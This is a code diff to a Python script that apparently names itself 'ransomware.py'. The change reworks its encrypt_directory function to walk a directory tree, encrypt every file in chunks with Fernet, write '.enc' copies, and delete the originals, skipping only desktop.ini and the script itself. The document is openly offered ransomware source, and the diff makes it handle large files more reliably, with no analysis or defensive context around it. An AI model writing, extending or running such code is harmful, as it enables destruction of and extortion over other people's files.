@@ -30,25 +30,28 @@ def validate_password(input_password):
     """Check if the provided password is correct."""
     return derive_key(input_password) == key
 
-def encrypt_directory(directory, key):
+def encrypt_directory(directory, key, chunk_size=1024 * 1024):
     try:
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
+                # Skip specific files
                 if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
 
                 filepath = os.path.join(root, file)
-                with open(filepath, "rb") as file_obj:
-                    file_data = file_obj.read()
-                
-                encrypted_data = f.encrypt(file_data)
                 encrypted_filepath = filepath + ".enc"
-                
-                with open(encrypted_filepath, "wb") as file_obj:
-                    file_obj.write(encrypted_data)
-                
-                os.remove(filepath)
+
+                try:
+                    with open(filepath, "rb") as file_obj, open(encrypted_filepath, "wb") as enc_file:
+                        while chunk := file_obj.read(chunk_size):
+                            encrypted_data = f.encrypt(chunk)
+                            enc_file.write(encrypted_data)
+                    
+                    os.remove(filepath)
+                    print(f"Encrypted: {filepath}")
+                except Exception as e:
+                    print(f"Failed to encrypt {filepath}: {e}")
 
         messagebox.showinfo("Success", "All files encrypted successfully!")
     except Exception as e:
